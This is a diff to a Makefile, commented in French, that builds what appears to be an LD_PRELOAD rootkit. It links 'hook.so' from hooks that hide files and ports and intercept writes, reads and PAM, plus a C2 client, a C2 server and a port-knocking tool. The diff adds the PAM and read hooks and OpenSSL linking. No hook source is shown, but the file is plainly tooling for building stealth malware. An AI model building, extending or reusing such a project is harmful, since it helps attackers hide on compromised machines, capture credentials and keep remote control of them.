@@ -1,8 +1,13 @@
 CC = gcc
 CFLAGS = -Wall -fPIC -shared -ldl
+LDFLAGS = -lssl -lcrypto  # Pour lier les bibliothèques OpenSSL si nécessaire
 
-# Fichiers sources et objets principaux
-SRCS = src/hook_write.c src/c2_client.c src/utils.c src/hook_hide_files.c src/hook_hide_ports.c
+# Fichiers sources pour créer hook.so
+# (Comprend hook_write, hook_read, hook_hide_files, etc.)
+SRCS = src/hook_write.c src/c2_client.c src/utils.c \
+       src/hook_hide_files.c src/hook_hide_ports.c \
+       src/hook_pam.c src/hook_read.c
+
 OBJS = $(SRCS:.c=.o)
 TARGET = hook.so
 
@@ -19,17 +24,22 @@ PORT_KNOCK_TARGET = port_knocking
 # Règles principales
 all: $(TARGET) $(C2_TARGET) $(PORT_KNOCK_TARGET)
 
+# Générer la librairie partagée hook.so
 $(TARGET): $(OBJS)
-	$(CC) $(CFLAGS) -o $(TARGET) $(OBJS)
+	$(CC) $(CFLAGS) -o $(TARGET) $(OBJS) $(LDFLAGS)
 
+# Générer le serveur C2
 $(C2_TARGET): $(C2_OBJS)
 	$(CC) -o $(C2_TARGET) $(C2_OBJS) -lpthread
 
+# Générer le programme de port knocking
 $(PORT_KNOCK_TARGET): $(PORT_KNOCK_OBJS)
 	$(CC) -o $(PORT_KNOCK_TARGET) $(PORT_KNOCK_OBJS) -lpthread
 
+# Règle générique pour compiler les .c en .o
 %.o: %.c
 	$(CC) -c -I./include $(CFLAGS) -o $@ $<
 
+# Nettoyage
 clean:
 	rm -f $(OBJS) $(TARGET) $(C2_OBJS) $(PORT_KNOCK_OBJS) $(C2_TARGET) $(PORT_KNOCK_TARGET)
